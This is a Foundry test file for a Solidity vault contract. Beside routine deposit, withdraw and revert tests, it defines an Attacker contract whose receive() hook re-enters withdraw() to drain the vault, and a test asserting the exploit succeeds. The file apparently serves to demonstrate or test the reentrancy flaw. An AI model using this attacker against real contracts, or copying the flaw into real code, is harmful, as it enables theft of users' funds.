// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Withdraw.sol";

contract Attacker {
    Withdraw public immutable target;
    uint256 public reentryCount;
    uint256 public maxReentries;

    constructor(Withdraw _target) {
        target = _target;
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && reentryCount < maxReentries) {
            reentryCount += 1;
            target.withdraw();
        }
    }

    function attack(uint256 _maxReentries) external payable {
        require(msg.value > 0, "No ETH sent");
        maxReentries = _maxReentries;

        target.deposit{value: msg.value}();
        target.withdraw();
    }
}

contract WithdrawTest is Test {
    Withdraw public vault;
    Attacker public attacker;
    address public user1;
    address public victim;

    function setUp() public {
        vault = new Withdraw();
        attacker = new Attacker(vault);

        user1 = makeAddr("user1");
        victim = makeAddr("victim");

        vm.deal(user1, 10 ether);
        vm.deal(victim, 10 ether);
    }

    function testDeposit() public {
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        assertEq(vault.getBalance(user1), 1 ether);
        assertEq(address(vault).balance, 1 ether);
    }

    function testWithdraw() public {
        vm.prank(user1);
        vault.deposit{value: 1 ether}();

        vm.prank(user1);
        vault.withdraw();

        assertEq(vault.getBalance(user1), 0);
        assertEq(address(vault).balance, 0);
    }

    function testGetBalance() public {
        vm.prank(user1);
        vault.deposit{value: 2 ether}();

        assertEq(vault.getBalance(user1), 2 ether);
        assertEq(vault.getBalance(victim), 0);
    }

    function test_RevertWhen_ZeroDeposit() public {
        vm.prank(user1);
        vm.expectRevert("Invalid deposit");
        vault.deposit{value: 0}();
    }

    function test_RevertWhen_InsufficientBalance() public {
        vm.prank(user1);
        vm.expectRevert("Insufficient balance");
        vault.withdraw();
    }

    function testReentrancyExploit() public {
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        vm.prank(user1);
        attacker.attack{value: 1 ether}(20);

        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vault).balance, 10 ether);
        assertEq(vault.getBalance(address(attacker)), 0);
    }
}
